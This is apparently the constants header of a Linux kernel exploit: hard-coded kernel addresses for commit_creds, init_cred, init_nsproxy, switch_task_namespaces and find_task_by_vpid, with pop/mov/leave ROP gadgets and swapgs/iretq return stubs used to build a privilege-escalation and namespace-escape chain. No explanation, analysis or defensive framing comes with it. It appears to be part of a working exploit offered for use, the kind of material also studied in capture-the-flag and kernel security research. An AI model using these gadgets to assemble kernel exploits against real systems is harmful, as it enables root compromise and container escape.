#define ARRAY_MAP_OPS_OFF 0xFFFFFFFF82C3F5C0
#define POP_RBX_RET 0xFFFFFFFF8113B167 //pop rbx ; ret
#define POP_RDI_RET 0xffffffff816db11d //pop rdi ; ret
#define INIT_CRED 0xffffffff83c72d60
#define INIT_NSPROXY 0xffffffff83c72880
#define SWITCH_TASK_NAMESPACES 0xFFFFFFFF811F31D0
#define COMMIT_CREDS 0xFFFFFFFF811F5530
#define FIND_TASK_BY_VPID 0xFFFFFFFF811E8D70
#define POP_RSI_RET 0xffffffff81094f1e
#define LEAVE_RET 0xffffffff81dcffa3
#define MOV_RDI_RAX_POP_RBX_RET 0xffffffff810f11f1 // mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi ; ret
#define SWAGPGS_RET 0xFFFFFFFF8241B036
#define IRETQ 0xFFFFFFFF8260123E
